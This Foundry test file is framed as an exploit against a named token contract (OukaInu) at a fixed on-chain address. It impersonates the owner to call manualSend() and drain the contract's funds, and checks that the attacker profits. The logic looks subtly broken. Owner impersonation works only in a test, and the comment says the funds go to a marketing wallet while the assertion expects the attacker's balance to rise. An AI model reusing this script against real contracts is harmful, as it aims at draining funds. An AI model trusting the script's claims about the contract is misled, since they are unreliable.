pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for the target contract
interface OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 {
    function getOwner() external view returns (address);
    function manualSend() external;
    function clearStuckBalance(uint256 amountPercentage) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
    address attacker = address(this);
    address owner;
    uint256 initialAttackerBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "OukaInu Contract");

        // Give the contract some BNB balance to drain
        deal(TARGET, 10 ether);

        // Store initial attacker balance for comparison
        initialAttackerBalance = address(attacker).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Impersonate the owner to call privileged function
        vm.startPrank(owner);

        // Call manualSend() to drain all BNB from contract to marketingFeeReceiver
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).manualSend();

        vm.stopPrank();

        // Alternative: Could also use clearStuckBalance(100)
        // vm.prank(owner);
        // OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).clearStuckBalance(100);

        // Verify attacker balance increased (oracle check)
        uint256 finalAttackerBalance = address(attacker).balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

